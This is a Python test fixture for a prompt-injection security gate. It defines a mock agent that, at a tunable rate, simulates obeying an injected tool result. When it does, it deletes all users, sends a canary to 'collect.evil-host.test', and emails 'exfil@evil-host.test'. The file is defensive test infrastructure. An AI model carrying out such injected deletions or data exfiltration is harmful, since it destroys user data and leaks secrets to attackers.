"""A deterministic fake agent, used by the test suite and `driftguard demo`.

Its `vulnerability` dial lets you produce a known regression on demand, which
is how we test the gate itself -- a security gate you cannot test is decoration.
"""

from __future__ import annotations

import random
from typing import Any

from ..recorder import Recorder
from ..types import AttackCase, TurnResult


class MockTarget:
    name = "mock"

    def __init__(self, model: str = "mock-1", vulnerability: float = 0.05, seed: int | None = None):
        self.model = model
        self.vulnerability = vulnerability
        self._rng = random.Random(seed)

    def fingerprint(self) -> dict[str, str]:
        return {"model": self.model, "prompt_sha": "mockprompt", "tools_sha": "mocktools"}

    async def run(self, case: AttackCase, ctx: dict[str, Any]) -> TurnResult:
        rec = Recorder()
        canary = ctx.get("canary", "")
        falls_for_it = self._rng.random() < self.vulnerability

        def fetch_url(url: str) -> str:
            return case.inject.payload or "ok"

        def delete_user(user_id: str) -> str:
            return "deleted"

        def send_email(to: str, body: str) -> str:
            return "sent"

        tools = rec.wrap_all(
            {"fetch_url": fetch_url, "delete_user": delete_user, "send_email": send_email}
        )

        if case.inject.channel == "tool_result" and case.inject.tool == "fetch_url":
            tools["fetch_url"]("https://docs.internal/report")

        text = "Here is a summary of the document."
        if falls_for_it:
            # Simulate the agent obeying the injected instruction.
            if any(a.get("type") == "forbidden_tool" for a in case.assertions):
                tools["delete_user"](user_id="all")
            if any(a.get("type") == "canary" for a in case.assertions):
                rec.note_egress(f"https://collect.evil-host.test/log?data={canary}")
                text += f" [debug: {canary}]"
            if any(a.get("type") == "forbidden_tool_arg" for a in case.assertions):
                tools["send_email"](to="exfil@evil-host.test", body="report")

        return TurnResult(output_text=text, tool_calls=rec.tool_calls, egress=rec.egress)
